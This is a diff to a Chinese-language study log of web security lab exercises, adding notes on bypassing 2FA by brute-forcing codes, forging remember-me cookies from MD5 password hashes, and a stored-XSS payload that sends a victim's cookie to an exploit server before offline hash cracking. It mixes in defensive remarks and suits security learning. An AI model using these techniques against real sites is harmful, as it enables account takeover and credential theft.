@@ -24,7 +24,7 @@
 
 ---
 
-## Authentication（认证缺陷）— 已完成 7/14（2026-08-11 开始）
+## Authentication（认证缺陷）— 已完成 10/14（2026-08-11 开始，2026-08-13 更新）
 
 | # | Lab | 核心考点 | 攻击手法 |
 |---|-----|---------|---------|
@@ -35,6 +35,9 @@
 | 5 | Username enumeration via response timing | 用户名枚举（响应时间差）+ 爆破保护绕过 | `X-Forwarded-For` 伪造 IP 绕过次数限制；超长密码放大时间差，按响应时间找有效用户名，再爆破密码（今天新做） |
 | 6 | Broken brute-force protection, IP block | IP 封锁绕过（成功登录重置计数） | 连错 3 次封 IP，XFF 伪造无效 → 爆破与正确登录（wiener:peter）交替发送，成功登录把失败计数刷回 0（今天新做） |
 | 7 | Username enumeration via account lock | 账户锁定枚举（防护机制当信号） | 有效账号连错 3 次触发锁定提示 → 用锁定提示枚举用户名；爆破密码时 grep extract 标记报错文案，正确密码的响应无报错即命中（今天新做） |
+| 8 | 2FA bypass using a broken logic | 2FA 逻辑缺陷（verify 参数可控）+ 验证码爆破 | GET /login2 改 verify=carlos 触发目标验证码 → 爆破 4 位 mfa-code → 302 命中（Burp CE 限速，Python 并发替代） |
+| 9 | Brute-forcing a stay-logged-in cookie | remember-me cookie 存密码哈希（可伪造） | cookie=base64(用户名:md5(密码)) → 预生成伪造 cookie 列表爆破 → 删掉 session cookie 只留 stay-logged-in → 200 命中即登录（官方用 Payload processing 动态转换） |
+| 10 | Offline password cracking | 密码哈希进 cookie + 存储型 XSS 组合 | 评论区 XSS 偷 carlos 的 stay-logged-in cookie → 解码拿 MD5 → 离线破解（hashcat）→ 明文登录删账户 |
 
 ---
 
@@ -150,14 +153,30 @@ username=carlos&password=xxx
 
 > 防御视角：错误文案必须统一（不管账号存在与否、是否锁定都返回同一句话）；锁定机制要防枚举（IP+账号组合计数），别让锁定提示变成账号存在性 oracle。
 
+### 2FA 逻辑缺陷：verify 参数可控（Authentication Lab 8）
+
+服务端用请求里的 `verify` 参数决定"正在验证谁的 2FA 码"，没绑定会话 → 改成 `verify=carlos` 就能让服务端生成/校验 carlos 的码。打法：`GET /login2?verify=carlos` 触发目标验证码 → 用自己的 session 爆 `mfa-code`（0000-9999）→ 302 命中。
+
+关键坑：**Burp Community 版 Intruder 限速**（~1 req/s），线程拉满没用，10000 次要挂几小时；换 Python 60 并发 2 分钟跑完。失败 200 / 成功 302，信号干净。
+
+### remember-me cookie 伪造爆破（Authentication Lab 9）
+
+`stay-logged-in = base64(用户名:md5(密码))` —— 密码哈希直接进 cookie，结构公开可伪造。打法：离线预生成 `base64(carlos:md5(候选词))` 列表直接导入 Intruder 爆破，200 命中。**关键：删掉自己的 session cookie 只留 stay-logged-in**，否则服务端优先认 session，所有请求都返回你自己的账户页。
+
+官方更优做法：Intruder **Payload processing**（Hash: MD5 → Add prefix: carlos: → Encode: Base64）请求时动态转换，同一份字典换 prefix 就能打任何用户；判定用 grep-match "Update email" 业务特征而非状态码。
+
+### 离线破解：XSS 偷 cookie → MD5 还原（Authentication Lab 10）
+
+评论区存储型 XSS → carlos 浏览评论时 `document.location='//exploit-server/'+document.cookie` 把 cookie 送到 exploit server 的 Access log → 解码得 `carlos:md5哈希` → 离线破解（hashcat -m 0 / 在线反查）→ 明文密码 → 登录删账户。
+
+认知：偷到的 remember-me cookie 本身就能登录（会话接管）；破解出明文是"长期资产"（密码复用/横向移动）。MD5 无盐 = 明文等价物；正确实现是随机 token + 服务端存储。
+
 ---
 
 ## 下一阶段
 
-Access Control 已全部完成 ✅，Authentication 进行中（7/14），剩余：
-- 2FA broken logic / 2FA bypass using a brute-force attack（2FA 逻辑缺陷/爆破）
-- Brute-forcing a stay-logged-in cookie（remember-me Cookie 爆破）
-- Offline password cracking（离线密码破解）
+Access Control 已全部完成 ✅，Authentication 进行中（10/14），剩余：
+- 2FA bypass using a brute-force attack（2FA 爆破）
 - Password reset poisoning via middleware（中间件密码重置投毒）
 - Password brute-force via password change（改密接口爆破）
 - Broken brute-force protection, multiple credentials per request（单请求多凭据）
